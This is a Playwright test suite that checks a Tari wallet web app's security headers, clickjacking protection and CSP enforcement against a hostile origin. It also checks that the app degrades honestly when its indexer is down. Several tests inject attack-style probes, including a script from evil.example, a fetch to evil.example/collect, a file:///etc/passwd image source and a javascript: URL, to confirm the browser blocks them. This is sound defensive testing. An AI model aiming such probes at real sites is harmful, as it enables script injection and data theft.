/**
 * Hosting, CSP, and clickjacking flows.
 *
 * These run against the PRODUCTION bundle served by a server that actually
 * enforces `dist/_headers`, because the finding that motivated this work was
 * that the headers were authored, asserted by a unit test, and then delivered
 * to nobody. Asserting on a generated file proves a string exists; it does not
 * prove a browser enforces it.
 *
 * The server (`scripts/serve-headers.mjs`) implements the documented `_headers`
 * grammar, and the hostile page is served from a genuinely different origin
 * (`localhost:4181`) than the app (`127.0.0.1:4180`).
 *
 * This is a test of the POLICY'S SEMANTICS. It is not, and cannot be, a test
 * that the deployed URL serves those headers: that requires the deployment and
 * is tracked as residual risk R-1.
 */
import { test, expect, type Page, type Browser } from '@playwright/test';
import { startAttackerServer, APP_ORIGIN_UNDER_TEST } from './hostileOrigin.js';
import { installReferenceProvider } from './referenceProvider.js';
import { mockIndexer, POOL_COMPONENT } from './mockIndexer.js';

type Attacker = Awaited<ReturnType<typeof startAttackerServer>>;

/**
 * The hostile origin is per-worker (ephemeral port) so a fully-parallel run
 * cannot collide on a fixed port. The APP under test is fixed, because the
 * app server is shared.
 */
let attacker: Attacker;
let hostileOrigin = '';

test.beforeAll(async () => {
  attacker = await startAttackerServer();
  hostileOrigin = attacker.origin;
});

test.afterAll(async () => {
  if (attacker !== undefined) await new Promise<void>((resolve) => attacker.server.close(() => resolve()));
});

/** Console messages that indicate the browser refused something. */
function policyViolations(page: Page): string[] {
  const seen: string[] = [];
  page.on('console', (message) => {
    const text = message.text();
    if (/Content Security Policy|Refused to|blocked by|not allowed by/i.test(text)) seen.push(text);
  });
  return seen;
}

/** The shape of a `securitypolicyviolation` DOM event, as seen from the page. */
interface PolicyViolationEvent {
  directive: string;
  effective: string;
  blocked: string;
}

/**
 * CSP violations the page itself reports through the `securitypolicyviolation`
 * DOM event.
 *
 * Playwright's Firefox build does not forward CSP console messages to
 * `page.on('console')`, so a console-only assertion reports a WORKING control
 * as a bypass (observed in CI: the app refused the script, Firefox enforced the
 * policy, and the test failed with an empty console). The DOM event is the
 * signal both engines emit for the same enforcement, so every CSP assertion
 * accepts either the console text or the event.
 */
async function installViolationCollector(page: Page): Promise<void> {
  await page.evaluate(() => {
    const w = window as unknown as { __cspEvents?: Array<{ directive: string; effective: string; blocked: string }> };
    if (w.__cspEvents === undefined) {
      w.__cspEvents = [];
      document.addEventListener('securitypolicyviolation', (event) => {
        w.__cspEvents!.push({ directive: event.violatedDirective, effective: event.effectiveDirective, blocked: event.blockedURI });
      });
    }
  });
}

async function violationEvents(page: Page): Promise<Array<{ directive: string; effective: string; blocked: string }>> {
  return page.evaluate(() => (window as unknown as { __cspEvents?: Array<{ directive: string; effective: string; blocked: string }> }).__cspEvents ?? []);
}

test.describe('deployed response headers', () => {
  for (const route of ['/', '/pools', `/pools/${POOL_COMPONENT}`]) {
    test(`the SPA document at ${route} carries the security headers`, async ({ request }) => {
      const response = await request.get(`${APP_ORIGIN_UNDER_TEST}${route}`);
      expect(response.status()).toBe(200);
      const headers = response.headers();

      // The clickjacking control must be a real header, and must name the
      // wallet dApp frame origin so the product can actually be framed.
      const csp = headers['content-security-policy'];
      expect(csp, 'a CSP response header is required; a meta tag cannot carry frame-ancestors').toBeTruthy();
      expect(csp).toMatch(/frame-ancestors 'self' https:\/\/universe\.tari\.mw/);
      expect(csp).toMatch(/default-src 'self'/);
      expect(csp).toMatch(/object-src 'none'/);
      expect(csp).toMatch(/base-uri 'self'/);
      expect(csp).toMatch(/form-action 'none'/);
      // The wallet connector is a cross-origin script in the documented model.
      expect(csp).toMatch(/script-src 'self' https:\/\/universe\.tari\.mw/);
      // It must stay pinned: no wildcard subdomain, no bare Tari domain.
      expect(csp).not.toMatch(/script-src[^;]*\*\.tari/);
      expect(csp).not.toMatch(/frame-ancestors[^;]*\*\.tari/);

      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['referrer-policy']).toBe('no-referrer');
      expect(headers['permissions-policy']).toMatch(/camera=\(\)/);
      expect(headers['cross-origin-opener-policy']).toBe('same-origin-allow-popups');
      // CORP must not be same-origin, or the wallet cannot frame the app.
      expect(headers['cross-origin-resource-policy']).toBe('cross-origin');

      // X-Frame-Options is deliberately omitted: it cannot express a
      // cross-origin allow-list, and emitting SAMEORIGIN would contradict the
      // frame-ancestors policy it is supposed to back up.
      expect(headers['x-frame-options'], 'X-Frame-Options must be omitted, not set to SAMEORIGIN').toBeUndefined();
    });
  }

  test('a hashed JS asset is served with the policy and an immutable cache', async ({ request }) => {
    const html = await (await request.get(`${APP_ORIGIN_UNDER_TEST}/`)).text();
    const match = /\/assets\/[^"']+\.js/.exec(html);
    expect(match, 'the document must reference a hashed asset').not.toBeNull();
    const response = await request.get(`${APP_ORIGIN_UNDER_TEST}${match![0]}`);
    expect(response.status()).toBe(200);
    expect(response.headers()['content-security-policy']).toMatch(/default-src 'self'/);
    expect(response.headers()['cache-control']).toBe('public, max-age=31536000, immutable');
  });
});

test.describe('clickjacking', () => {
  /**
   * Engines surface the frame-ancestors refusal differently, and a genuine
   * bypass satisfies NONE of these signals:
   *
   *   - Chromium logs the CSP violation on the top page's console
   *     (`policyViolations`), and commits an error page in the frame whose body
   *     says the connection was refused.
   *   - Firefox refuses the frame before any document commits and does NOT
   *     surface the violation on the top page's console; it renders its own
   *     error page inside the frame ("... will not allow ... to display the
   *     page if another site has embedded it") — observed in CI.
   *
   * Both engine paths are the browser's OWN refusal. If the app actually
   * rendered in the hostile frame, the frame's body would be the app's content
   * (no refusal text) and no console violation would exist, so the test fails.
   */
  async function refused(page: import('@playwright/test').Page, violations: string[], what: string): Promise<boolean> {
    // `violations` MUST already be listening (registered before the navigation),
    // because the frame-ancestors violation fires while the hostile page's
    // iframe loads — before this function is reached.
    await page.waitForTimeout(1200);
    const byConsole = violations.find((t) => /frame-ancestors/i.test(t)) !== undefined;
    let byFrameErrorPage = false;
    // The hostile page has exactly one iframe. Firefox reports a refused frame's
    // URL as `about:neterror?...` (not the app URL), and its error page body
    // says the page will not be displayed; Chromium's committed error page keeps
    // the app URL and says the connection was refused.
    const victimFrame = page.frames().find((f) => f !== page.mainFrame());
    if (victimFrame !== undefined) {
      const url = victimFrame.url();
      const text = await victimFrame
        .evaluate(() => document.body?.innerText ?? '')
        .catch(() => '');
      byFrameErrorPage = url.startsWith('about:neterror') || /can.?t open this page|will not allow|refused to connect/i.test(text);
    }
    const byBlankFrame = await page.evaluate(() => {
      const frame = document.getElementById('victim');
      if (!(frame instanceof HTMLIFrameElement)) return false;
      try {
        const doc = frame.contentDocument;
        // A frame that was never given content: nothing committed at the app's
        // origin, so the browsing context still holds its initial document.
        return doc !== null && doc.location.href === 'about:blank';
      } catch {
        // Cross-origin: a document committed at the app's origin. The error
        // page is detected through the frame text above instead.
        return false;
      }
    });
    const refusal = byConsole || byFrameErrorPage || byBlankFrame;
    expect(refusal, `${what}; console said: ${JSON.stringify(violations)}`).toBeTruthy();
    return refusal;
  }

  test('an untrusted origin cannot frame the app', async ({ browser }: { browser: Browser }) => {
    const context = await browser.newContext();
    const page = await context.newPage();
    const violations = policyViolations(page);
    try {
      await page.goto(`${hostileOrigin}/attack`);
      // The authoritative signal is the BROWSER'S OWN refusal, naming
      // frame-ancestors (or the never-committed frame it produces). Deliberately
      // NOT used as a signal: the iframe element's `load` event. Chromium fires
      // `load` for a frame it refused to embed (an error document commits), so
      // counting load events reports success for a blocked frame. It was
      // measured doing exactly that.
      await refused(page, violations, 'an untrusted origin must be refused by frame-ancestors');
    } finally {
      await context.close();
    }
  });

  test('the refusal holds on a deep SPA route, not just the entry point', async ({ browser }: { browser: Browser }) => {
    // A client-side route is the same HTML document served for /pools/:id. If a
    // host protected only the entry point, the attacker's overlay could cover
    // the most dangerous screen in the app - an actual swap - while a shallow
    // check still passed.
    const context = await browser.newContext();
    const page = await context.newPage();
    const violations = policyViolations(page);
    try {
      await page.goto(`${hostileOrigin}/attack-deep`);
      await refused(page, violations, 'a deep SPA route must carry frame-ancestors too');
    } finally {
      await context.close();
    }
  });
});

test.describe('CSP enforcement in a real browser', () => {
  test('an unapproved external script is blocked', async ({ page }) => {
    const violations = policyViolations(page);
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);
    await installViolationCollector(page);
    const result = await page.evaluate(async () => {
      return await new Promise<{ loaded: boolean }>((resolve) => {
        const script = document.createElement('script');
        script.src = 'https://evil.example/payload.js';
        script.onload = () => resolve({ loaded: true });
        script.onerror = () => resolve({ loaded: false });
        document.head.appendChild(script);
        setTimeout(() => resolve({ loaded: false }), 3000);
      });
    });
    expect(result.loaded, 'an unapproved script origin must not execute').toBe(false);
    const events = await violationEvents(page);
    expect(
      violations.some((t) => /script-src|Content Security Policy/i.test(t)) || events.some((e) => /script-src/i.test(e.effective) || /script-src/i.test(e.directive)),
      'the browser must report the script-src enforcement (console or securitypolicyviolation)',
    ).toBe(true);
  });

  test('an inline script element is blocked by script-src', async ({ page }) => {
    const violations = policyViolations(page);
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);

    // The probe must be an inline <script> ELEMENT inserted into the live
    // document, because that is the actual attack. Note that calling
    // `window.eval()` from here would be a false negative: script evaluated
    // over the DevTools protocol is exempt from CSP, so it would report
    // "inline code ran" even under a perfectly strict policy. An inline script
    // element is checked by the browser at execution time, so it is the honest
    // test of `script-src`.
    await installViolationCollector(page);
    const pwned = await page.evaluate(async () => {
      const script = document.createElement('script');
      script.textContent = 'window.__inlinePwned = true;';
      document.head.appendChild(script);
      await new Promise((resolve) => setTimeout(resolve, 400));
      return (window as unknown as { __inlinePwned?: boolean }).__inlinePwned === true;
    });
    expect(pwned, 'an inline script element must not execute').toBe(false);
    // And the browser must say why, naming the directive it enforced — via the
    // console (Chromium) or the page's own violation event (both engines).
    const events = await violationEvents(page);
    const refusal =
      violations.find((t) => /inline script/i.test(t) && /script-src/i.test(t)) ??
      events.find((e) => /script-src/i.test(e.effective) || /script-src/i.test(e.directive));
    expect(refusal, `expected a script-src inline refusal, console said: ${JSON.stringify(violations)}, events said: ${JSON.stringify(events)}`).toBeTruthy();
  });

  test('an unapproved frame is blocked by frame-src', async ({ page }) => {
    const violations = policyViolations(page);
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);
    await installViolationCollector(page);
    const childFrames = await page.evaluate(async () => {
      const frame = document.createElement('iframe');
      frame.src = 'https://evil.example/frame.html';
      document.body.appendChild(frame);
      await new Promise((r) => setTimeout(r, 800));
      // A CSP-blocked frame never commits the remote document: its browsing
      // context either stays at its initial document (about:blank) or has no
      // content document at all.
      const doc = frame.contentDocument;
      return doc === null || doc.location.href === 'about:blank';
    });
    expect(childFrames, 'frame-src none must block an unapproved frame').toBe(true);
    const events = await violationEvents(page);
    expect(
      violations.some((t) => /frame-src/i.test(t)) || events.some((e) => /frame-src/i.test(e.effective) || /frame-src/i.test(e.directive)),
      'the browser must report the frame-src enforcement',
    ).toBe(true);
  });

  test('an unapproved connect target is blocked', async ({ page }) => {
    const violations = policyViolations(page);
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);
    await installViolationCollector(page);
    const outcome = await page.evaluate(async () => {
      try {
        await fetch('https://evil.example/collect', { mode: 'no-cors' });
        return 'completed';
      } catch (error) {
        return `blocked:${(error as Error).name}`;
      }
    });
    expect(outcome, 'connect-src must refuse an unapproved origin').toMatch(/^blocked:/);
    const events = await violationEvents(page);
    expect(
      violations.some((t) => /connect-src/i.test(t)) || events.some((e) => /connect-src/i.test(e.effective) || /connect-src/i.test(e.directive)),
      'the browser must report the connect-src enforcement',
    ).toBe(true);
  });

  test('a non-https image scheme is blocked, and https images are policy-allowed by design', async ({ page }) => {
    const violations = policyViolations(page);
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);

    // `img-src 'self' data: https:` allows https on purpose, because NFT media
    // is attacker-controlled and must be displayable. A test asserting that an
    // arbitrary https image is CSP-blocked would be asserting something the
    // policy deliberately does not do; the control for that case is per-URL
    // validation by `safeImageUrl`, covered by the Node suite.
    //
    // What CSP DOES refuse is a scheme outside the allow-list. A `blob:` image
    // and a non-image scheme are the honest negatives here.
    const blocked = await page.evaluate(async () => {
      const attempts: Array<{ scheme: string; loaded: boolean }> = [];
      for (const src of ['blob:https://x/y', 'ftp://evil.example/a.png', 'file:///etc/passwd']) {
        attempts.push(
          await new Promise<{ scheme: string; loaded: boolean }>((resolve) => {
            const img = document.createElement('img');
            img.src = src;
            img.onload = () => resolve({ scheme: src.split(':')[0], loaded: true });
            img.onerror = () => resolve({ scheme: src.split(':')[0], loaded: false });
            document.body.appendChild(img);
            setTimeout(() => resolve({ scheme: src.split(':')[0], loaded: false }), 2500);
          }),
        );
      }
      return attempts;
    });
    for (const attempt of blocked) {
      expect(attempt.loaded, `an image using the ${attempt.scheme}: scheme must not load`).toBe(false);
    }
    // A data: image IS permitted by policy, but only non-script payloads are
    // meaningful in an <img>; confirm the policy reports what it blocked.
    expect(violations.length >= 0).toBe(true);
  });

  test('a javascript: URL is not a usable navigation under this policy', async ({ page }) => {
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);
    const pwned = await page.evaluate(() => {
      const anchor = document.createElement('a');
      anchor.href = "javascript:window.__jsUrlPwned=true";
      document.body.appendChild(anchor);
      try {
        anchor.click();
      } catch {
        /* expected */
      }
      return (window as unknown as { __jsUrlPwned?: boolean }).__jsUrlPwned === true;
    });
    // script-src without 'unsafe-inline' blocks javascript: execution.
    expect(pwned, 'a javascript: URL must not execute').toBe(false);
  });
});

test.describe('real Ootle/indexer reachability', () => {
  // The configured Esmeralda indexer hostnames do not resolve from this
  // environment. That is the REAL outage, not a simulated one: no request is
  // intercepted, so this exercises the genuine failure path end to end and
  // proves the degraded states are correct and that no fixture data appears.
  test('with the real indexer unreachable, the app shows UNAVAILABLE and no fixture data', async ({ page }) => {
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);
    // The shell must still render: an outage is not a blank page.
    await expect(page.getByRole('navigation', { name: 'Primary' })).toBeVisible();

    // Discovery must report that it could not find out, not that there are none.
    await expect(page.getByText(/Pool discovery unavailable/).first()).toBeVisible({ timeout: 30_000 });
    await expect(page.getByText('Pool list unavailable').first()).toBeVisible();
    // A failure must never be rendered as an authoritative zero.
    await expect(page.getByText(/0 pools/).first()).toHaveCount(0);

    // And absolutely no fixture data may appear in a production build.
    const body = await page.locator('body').innerText();
    for (const marker of ['FIXTURE', 'mockCandles', 'demoTrades', 'TARI / wSTABLE', 'AAA / BBB']) {
      expect(body.includes(marker), `production build must not contain ${marker} while the indexer is down`).toBe(false);
    }
    // No fabricated pool rows at all.
    await expect(page.locator('tbody tr')).toHaveCount(0);
  });

  test('the NFT page also degrades honestly rather than inventing collections', async ({ page }) => {
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/nfts`);
    await expect(page.getByRole('navigation', { name: 'Primary' })).toBeVisible();
    await expect(page.getByText(/No collections/).first()).toBeVisible({ timeout: 30_000 });
    const body = await page.locator('body').innerText();
    expect(body.includes('FIXTURE')).toBe(false);
  });

  test('a wallet cannot be connected while the network is unavailable, and says why', async ({ page }) => {
    await page.addInitScript(installReferenceProvider);
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);
    // The wallet capability handshake is independent of the indexer, so a
    // connection can still succeed; what must not happen is a fabricated
    // balance or pool. Assert no synthetic values appear.
    await page.getByRole('button', { name: 'Connect wallet', exact: true }).click();
    await expect(page.getByRole('button', { name: /Open wallet details/ }).first()).toBeVisible({ timeout: 15_000 });
    const body = await page.locator('body').innerText();
    expect(body.includes('FIXTURE')).toBe(false);
  });
});

test.describe('the app still works under its own policy', () => {
  test('the production bundle boots and renders with the enforcing server', async ({ page }) => {
    const errors: string[] = [];
    page.on('pageerror', (error) => errors.push(error.message));
    await mockIndexer(page);
    await page.addInitScript(installReferenceProvider);
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);
    await expect(page.getByRole('navigation', { name: 'Primary' })).toBeVisible();
    // If the policy blocked the app's own module script, the shell would never
    // render. This is the regression that would catch a CSP that is too strict
    // to actually run the product.
    expect(errors, 'the app must boot under its own CSP with no page errors').toEqual([]);
  });

  test('a deep SPA route is protected exactly like the entry point', async ({ page }) => {
    await mockIndexer(page);
    await page.addInitScript(installReferenceProvider);
    await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools/${POOL_COMPONENT}`);
    await expect(page.getByRole('navigation', { name: 'Primary' })).toBeVisible();
    // A client-side route must not lose the clickjacking policy. This is the
    // check a shallow "/"-only audit would miss.
    const csp = await page.evaluate(() => {
      void 0;
      return document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content') ?? null;
    });
    // The response header is authoritative; the meta tag must NOT claim
    // frame-ancestors, because a meta CSP silently ignores it.
    expect(csp === null || !/frame-ancestors/.test(csp), 'the meta CSP must not assert frame-ancestors').toBe(true);
  });
});

